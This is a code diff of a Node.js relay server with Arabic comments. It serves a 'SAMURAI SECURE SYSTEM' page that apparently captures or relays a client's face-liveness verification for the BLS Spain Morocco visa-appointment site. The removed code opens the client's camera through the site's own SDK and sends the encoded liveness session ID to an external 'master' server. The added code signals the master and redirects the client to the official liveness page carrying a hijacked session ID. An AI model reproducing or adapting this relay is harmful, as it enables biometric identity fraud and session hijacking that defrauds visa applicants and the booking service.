@@ -11,7 +11,7 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 [تعديل جذري] نقطة دخول العميل: صفحة وسيطة تقوم بفتح الكاميرا الحقيقية مباشرة
+    // 🔥 صفحة وسيطة سريعة تقوم بتحويل العميل للموقع الرسمي فوراً
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(`
@@ -28,69 +28,28 @@ const server = http.createServer((req, res) => {
             </head>
             <body>
                 <h1>SAMURAI SECURE SYSTEM</h1>
-                <p id="status">[ CONNECTING TO SECURE CHANNEL ]</p>
+                <p id="status">[ INITIALIZING SECURE CONNECTION... ]</p>
                 <div class="spinner"></div>
 
-                <!-- استدعاء مكتبة الكاميرا الأصلية مباشرة لكي تظهر لدى العميل بدون شاشة بيضاء -->
-                <script src="https://www.blsspainmorocco.net/Scripts/OzLiveness.js"></script>
                 <script>
                     const urlParams = new URLSearchParams(window.location.search);
                     const sessionId = urlParams.get('session');
                     const SERVER_URL = "https://silfi-production.up.railway.app";
 
-                    function updateStatus(text) {
-                        document.getElementById('status').innerText = text;
-                    }
-
-                    if (!sessionId) {
-                        updateStatus("❌ ERROR: INVALID SESSION");
-                    } else {
-                        // إعلام الماستر أن العميل انضم
+                    if (sessionId) {
+                        // إعلام الماستر بأن العميل قام بفتح الرابط
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
                         }).catch(e => {});
 
+                        // التوجيه التلقائي لموقع الحجز الرسمي لتبدأ الإضافة بالعمل فوراً
                         setTimeout(() => {
-                            updateStatus("CAMERA READY - PLEASE VERIFY YOUR FACE");
-                            
-                            // فتح الكاميرا تلقائياً للعميل
-                            if (typeof window.OzLiveness !== 'undefined') {
-                                window.OzLiveness.open({
-                                    lang: 'en',
-                                    overlay_options: false,
-                                    action: ['video_selfie_blank'],
-                                    result_mode: 'safe',
-                                    on_complete: function(result) {
-                                        const uuid = result.event_session_id;
-                                        updateStatus("VERIFICATION SUCCESSFUL - SENDING DATA...");
-
-                                        const encodedPayload = btoa(JSON.stringify({ result: uuid }));
-                                        fetch(SERVER_URL, {
-                                            method: 'POST',
-                                            headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({ session_id: sessionId, payload: encodedPayload })
-                                        })
-                                        .then(() => {
-                                            updateStatus("DONE ✔ - YOU CAN CLOSE THIS PAGE");
-                                        }).catch(() => {
-                                            updateStatus("ERROR SENDING DATA TO MASTER");
-                                        });
-                                    },
-                                    on_error: function(err) {
-                                        updateStatus("CAMERA ERROR: " + (err.message || "Permission Denied"));
-                                        fetch(SERVER_URL, {
-                                            method: 'POST',
-                                            headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({ type: "CLIENT_ERROR", session_id: sessionId, reason: err.message })
-                                        }).catch(e => {});
-                                    }
-                                });
-                            } else {
-                                updateStatus("⚠️ LIVENESS SDK LOAD FAILED");
-                            }
+                            window.location.href = "https://www.blsspainmorocco.net/MAR/appointment/livenessrequest?session=" + sessionId;
                         }, 1500);
+                    } else {
+                        document.getElementById('status').innerText = "[ ERROR: INVALID SESSION ]";
                     }
                 </script>
             </body>
@@ -109,7 +68,6 @@ const server = http.createServer((req, res) => {
 
                 if (targetSession && masters[targetSession]) {
                     const masterWs = masters[targetSession];
-                    
                     if (masterWs.readyState === WebSocket.OPEN) {
                         let messageToMaster = null;
 
